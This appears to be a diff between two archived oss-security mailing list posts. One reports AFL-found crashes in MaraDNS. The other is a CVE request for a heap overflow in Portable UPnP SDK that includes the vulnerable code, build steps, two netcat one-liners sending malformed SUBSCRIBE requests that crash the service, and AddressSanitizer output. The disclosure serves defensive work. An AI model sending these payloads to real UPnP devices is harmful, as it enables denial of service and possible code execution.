@@ -1,92 +1,228 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/11/14/2
-Message-Id: <1479102804.3372667.786730489.054A352E@webmail.messagingengine.com>
-Date: Mon, 14 Nov 2016 06:53:24 +0100
-From: Ondřej Surý <ondrej@...y.org>
-To: oss-security@...ts.openwall.com, Sam Trenholme <sam-k6mymjcnjpz3fmkieotlt7rbgvqt98qy@...iam.org>
-Subject: Re: Remote crash in MaraDNS 2.0.13 and git master
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/07/7
+Message-ID: <CAJ+owFsAGn7MJt+DWtLSwMkUrEqGWj0X2To+De3UaU6DjYqQ-w@mail.gmail.com>
+Date: Tue, 6 Sep 2016 23:56:33 -0400
+From: Scott Tenaglia <scott.tenaglia@...incea.com>
+To: oss-security@...ts.openwall.com, cve-assign@...re.org
+Subject: CVE Request - Portable UPnP SDK 1.6.19 through 1.8.x
 Content-Type: text/plain; charset=utf-8
 
-Hi all,
+Portable UPnP SDK: https://sourceforge.net/projects/pupnp/
+Bug report: https://sourceforge.net/p/pupnp/bugs/133/
 
-AFL found another 5 crashes totaling to 6 unique crashes. Looking at the
-backtraces it
-looks like, it's just 3 unique crashes:
+There is a heap buffer overflow vulnerability in the create_url_list
+function in upnp/src/gena/gena_device.c. I first discovered this
+vulnerability when working with version 1.6.19 and have confirmed that it
+also exists in the latest code on the master branch (1.8.x). At the very
+least a reliable denial of service condition can be created by crashing the
+program.
 
-- js_readuint16
-- js_substr
+The problem in create_url_list starts in the following for-loop. The point
+of the loop is to parse the list of URIs enclosed in angled brackets (‘<‘
+and ‘>’) in the CALLBACK header of a SUBSCRIBE request. If the call to
+parse_uri() fails for any reason other than UPNP_E_OUTOF_MEMORY, or the
+hostport field of the parsed URI has a size of zero, then the URLcount
+variable will not be incremented. If 2 URIs are provided, with the first
+one being correctly formatted, and the second not, then URLcount will equal
+1 coming out of this loop.
 
-- process_query -> this in fact looks like stack smashing, since it
-crashes on htons in an unrelated place
+    for( i = 0; i < URLS->size; i++ ) {
+        if( ( URLS->buff[i] == '<' ) && ( i + 1 < URLS->size ) ) {
+            if( ( ( return_code = parse_uri( &URLS->buff[i + 1],
+                                             URLS->size - i + 1,
+                                             &temp ) ) == HTTP_SUCCESS )
+                && ( temp.hostport.text.size != 0 ) ) {
+                URLcount++;
+            } else {
+                if( return_code == UPNP_E_OUTOF_MEMORY ) {
+                    return return_code;
+                }
+            }
+        }
+    }
 
-id:000000
-id:000002
-Program received signal SIGSEGV, Segmentation fault.
-js_readuint16 (js=js@...ry=0x6de290, offset=offset@...ry=4) at
-JsStr.c:1064
-1064               (*(js->string + offset + 1) & 0xff);
+The next bit of code (abbreviated for readability) is where the overflow
+actually occurs. The first conditional evaluates to true because URLcount
+is 1. Next, a buffer is allocated (out->URLs) to hold a copy of the
+original URI string. Then, an array of uri_type structs are allocated
+(out->parsedURLs) to hold details of each parsed URI. The size of this
+array is going to be 1, because URLcount is 1. The problem is that the
+for-loop then parses the *original* URI string again. In fact, the only
+real difference between this for-loop and the previous one is that the
+parsed URIs are stored at successive indexes in the parsedURLs array
+instead of a temporary variable. So when it gets to parsing the second URI
+it passes out->parsedURLs[2] to the parse_uri() function, which is an
+address passed the end of the allocated array. As parse_uri() populates
+values of the struct it is writing passed the end of the array.
 
+    if( URLcount > 0 ) {
+        out->URLs = malloc(URLS->size + 1);
+        out->parsedURLs = malloc(sizeof(uri_type) * URLcount);
+        // omitted for readability
+        memcpy( out->URLs, URLS->buff, URLS->size );
+        out->URLs[URLS->size] = 0;
+        URLcount = 0;
+        for( i = 0; i < URLS->size; i++ ) {
+            if( ( URLS->buff[i] == '<' ) && ( i + 1 < URLS->size ) ) {
+                if( ( ( return_code =
+                        parse_uri( &out->URLs[i + 1], URLS->size - i + 1,
+                                   &out->parsedURLs[URLcount] ) ) ==
+                      HTTP_SUCCESS )
+                    && ( out->parsedURLs[URLcount].hostport.text.size !=
+                         0 ) ) {
+                    URLcount++;
+                } else {
+                    if( return_code == UPNP_E_OUTOF_MEMORY ) {
+                        free( out->URLs );
+                        free( out->parsedURLs );
+                        out->URLs = NULL;
+                        out->parsedURLs = NULL;
+                        return return_code;
+                    }
+                }
+            }
+        }
+    }
 
-id:000001
-id:000005
-Program received signal SIGSEGV, Segmentation fault.
-js_substr (source=source@...ry=0x6de290, dest=dest@...ry=0x6e37f0,
-start=start@...ry=99, count=count@...ry=63743) at JsStr.c:731
-731               *(source->string + counter + start *
-source->unit_size);
+Depending on the format of the malformed URI different things happen.
+Sometimes the overwrite has no noticeable impact, while other times it will
+crash the program. At the very least it is possible to create a reliable
+denial of service condition. It may also be possible to use this for remote
+code execution.
 
-NOTE: id000001 cannot be reproduced on git master, but id000005 still
-crashes it, so they probably are separate issues after all.
+Below are the steps that I used to trigger the vulnerability on both
+version 1.6.19 and 1.8.0. They should be sufficient to recreate the issue.
 
-id:000003
-id:000004
-Program received signal SIGSEGV, Segmentation fault.
-proc_query (raw=0x6de5d0, ect=0x7fffffffd940, sock=0) at MaraDNS.c:2615
-2615        ip = htonl((z->sin_addr).s_addr);
+First, compile for 32-bit with debugging enabled and an installation
+directory set. The reason for the setting the installation directory and
+compiling for 32-bits is so that “make install” results in a single binary
+that is easy to debug.
 
-This is after 58 AFL cycles.
+./configure --prefix=<install dir> --enable-debug --host=i686-linux-gnu
+CFLAGS="-m32 -fno-omit-frame-pointer" LDFLAGS=-m32
+make clean;make install
 
-It will be worth retesting with ASAN enabled.
+To setup the default sample, which emulates a TV device, do the following
+from the libupnp directory:
+cd upnp/sample
+mkdir tvdevice
+cp -r web tvdevice
 
-Cheers,
--- 
-Ondřej Surý <ondrej@...y.org>
-Knot DNS (https://www.knot-dns.cz/) – a high-performance DNS server
-Knot Resolver (https://www.knot-resolver.cz/) – secure, privacy-aware,
-fast DNS(SEC) resolver
-Vše pro chleba (https://vseprochleba.cz) – Mouky ze mlýna a potřeby pro
-pečení chleba všeho druhu
+To run the sample change to the directory you just created and run the
+binary:
+cd tvdevice
+../.libs/tv_device
 
-On Sat, Nov 12, 2016, at 09:39, Ondřej Surý wrote:
-> Hi,
-> 
-> while playing with fuzzing the DNS servers with AFL (2.35b) I found a
-> remote crash bug in MaraDNS 2.0.13 js_readuint16. It can be also
-> reproduced using https://github.com/samboy/MaraDNS/ master branch.
-> 
-> Attached is patch to allow the fuzzing (it overrides getudp() with
-> read(0, ..)), the input data that crashes MaraDNS, and the bt full
-> output.
-> 
-> Please assign CVE, I would provide a patch, but MaraDNS code is
-> extremely hard to navigate for me, so I'll leave the fix for the code
-> author.
-> 
-> AFL has finished only 1 cycle (and found the 1 unique crash), so I'll
-> keep it running for a while.
-> 
-> Cheers,
-> -- 
-> Ondřej Surý <ondrej@...y.org>
-> Knot DNS (https://www.knot-dns.cz/) – a high-performance DNS server
-> Knot Resolver (https://www.knot-resolver.cz/) – secure, privacy-aware,
-> fast DNS(SEC) resolver
-> Vše pro chleba (https://vseprochleba.cz) – Mouky ze mlýna a potřeby pro
-> pečení chleba všeho druhu
-> Email had 3 attachments:
-> + maradns.btfull
->   5k (application/octet-stream)
-> + allow-fuzzing.patch
->   2k (text/x-patch)
-> + id:000000,sig:11,src:007564,op:havoc,rep:32
->   1k (application/octet-stream)
+With the sample running go to another terminal window. Enter the following
+to create a non-malicious subscription message:
+printf "SUBSCRIBE /upnp/event/tvcontrol1 HTTP/1.1\r\nHOST:
+0.0.0.0:49152\r\nCALLBACK:
+<http://127.0.0.1:49153>\r\nNT: upnp:event\r\nTIMEOUT: Second-1801\r\n\r\n"
+| nc 127.0.0.1 49152
+
+One form of a malicious message will crash the application is:
+printf "SUBSCRIBE /upnp/event/tvcontrol1 HTTP/1.1\r\nHOST:
+0.0.0.0:49152\r\nCALLBACK:
+<http://127.0.0.1:49153><http://a:49153\r\nNT: upnp:event\r\nTIMEOUT:
+Second-1801\r\n\r\n" | nc 127.0.0.1 49152
+
+Another is:
+printf "SUBSCRIBE /upnp/event/tvcontrol1 HTTP/1.1\r\nHOST:
+0.0.0.0:49152\r\nCALLBACK:
+<http://127.0.0.1:49153><//:49153\r\nNT: upnp:event\r\nTIMEOUT:
+Second-1801\r\n\r\n" | nc 127.0.0.1 49152
+
+Below is the output of address sanitizer from either of the two requests
+above (add “-fsanitize=address” to CFLAGS  during configure).
+
+=================================================================
+==13048== ERROR: AddressSanitizer: heap-buffer-overflow on address
+0xeef07710 at pc 0xf698b0c3 bp 0xf1463998 sp 0xf1463988
+WRITE of size 4 at 0xeef07710 thread T8
+    #0 0xf698b0c2
+(/home/user/Downloads/pupnp-code/install/lib/libupnp.so.10.0.0+0x460c2)
+    #1 0xf698cb13
+(/home/user/Downloads/pupnp-code/install/lib/libupnp.so.10.0.0+0x47b13)
+    #2 0xf6992e1c
+(/home/user/Downloads/pupnp-code/install/lib/libupnp.so.10.0.0+0x4de1c)
+    #3 0xf6993bae
+(/home/user/Downloads/pupnp-code/install/lib/libupnp.so.10.0.0+0x4ebae)
+    #4 0xf69999f3
+(/home/user/Downloads/pupnp-code/install/lib/libupnp.so.10.0.0+0x549f3)
+    #5 0xf6964b8f
+(/home/user/Downloads/pupnp-code/install/lib/libupnp.so.10.0.0+0x1fb8f)
+    #6 0xf6964e58
+(/home/user/Downloads/pupnp-code/install/lib/libupnp.so.10.0.0+0x1fe58)
+    #7 0xf693baa4
+(/home/user/Downloads/pupnp-code/install/lib/libthreadutil.so.10.0.0+0x5aa4)
+    #8 0xf6a02766 (/usr/lib/libasan.so.0.0.0+0x1b766)
+    #9 0xf69f13bc (/usr/lib/libasan.so.0.0.0+0xa3bc)
+    #10 0xf68feb2b (/usr/lib/libpthread-2.17.so+0x6b2b)
+    #11 0xf683276d (/usr/lib/libc-2.17.so+0xf776d)
+0xeef07710 is located 8 bytes to the right of 168-byte region
+[0xeef07660,0xeef07708)
+allocated by thread T8 here:
+    #0 0xf69fe45f (/usr/lib/libasan.so.0.0.0+0x1745f)
+    #1 0xf69928da
+(/home/user/Downloads/pupnp-code/install/lib/libupnp.so.10.0.0+0x4d8da)
+    #2 0xf6993bae
+(/home/user/Downloads/pupnp-code/install/lib/libupnp.so.10.0.0+0x4ebae)
+    #3 0xf69999f3
+(/home/user/Downloads/pupnp-code/install/lib/libupnp.so.10.0.0+0x549f3)
+    #4 0xf6964b8f
+(/home/user/Downloads/pupnp-code/install/lib/libupnp.so.10.0.0+0x1fb8f)
+    #5 0xf6964e58
+(/home/user/Downloads/pupnp-code/install/lib/libupnp.so.10.0.0+0x1fe58)
+    #6 0xf693baa4
+(/home/user/Downloads/pupnp-code/install/lib/libthreadutil.so.10.0.0+0x5aa4)
+    #7 0xf6a02766 (/usr/lib/libasan.so.0.0.0+0x1b766)
+    #8 0xf683276d (/usr/lib/libc-2.17.so+0xf776d)
+Thread T8 created by T0 here:
+    #0 0xf69f12ca (/usr/lib/libasan.so.0.0.0+0xa2ca)
+    #1 0xf693be13
+(/home/user/Downloads/pupnp-code/install/lib/libthreadutil.so.10.0.0+0x5e13)
+    #2 0xf693c882
+(/home/user/Downloads/pupnp-code/install/lib/libthreadutil.so.10.0.0+0x6882)
+    #3 0xf6967c74
+(/home/user/Downloads/pupnp-code/install/lib/libupnp.so.10.0.0+0x22c74)
+    #4 0xf69a2aee
+(/home/user/Downloads/pupnp-code/install/lib/libupnp.so.10.0.0+0x5daee)
+    #5 0xf69a2d2d
+(/home/user/Downloads/pupnp-code/install/lib/libupnp.so.10.0.0+0x5dd2d)
+    #6 0x804fc17
+(/home/user/Downloads/pupnp-code/upnp/sample/.libs/tv_device+0x804fc17)
+    #7 0x805056c
+(/home/user/Downloads/pupnp-code/upnp/sample/.libs/tv_device+0x805056c)
+    #8 0x8050631
+(/home/user/Downloads/pupnp-code/upnp/sample/.libs/tv_device+0x8050631)
+    #9 0xf6754942 (/usr/lib/libc-2.17.so+0x19942)
+Shadow bytes around the buggy address:
+  0x3dde0e90: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x3dde0ea0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x3dde0eb0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x3dde0ec0: fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00
+  0x3dde0ed0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x3dde0ee0: 00 fa[fa]fa fa fa fa fa fa fa 00 00 00 00 00 00
+  0x3dde0ef0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x3dde0f00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x3dde0f10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x3dde0f20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x3dde0f30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07
+  Heap left redzone:     fa
+  Heap righ redzone:     fb
+  Freed Heap region:     fd
+  Stack left redzone:    f1
+  Stack mid redzone:     f2
+  Stack right redzone:   f3
+  Stack partial redzone: f4
+  Stack after return:    f5
+  Stack use after scope: f8
+  Global redzone:        f9
+  Global init order:     f6
+  Poisoned by user:      f7
+  ASan internal:         fe
+==13048== ABORTING
+
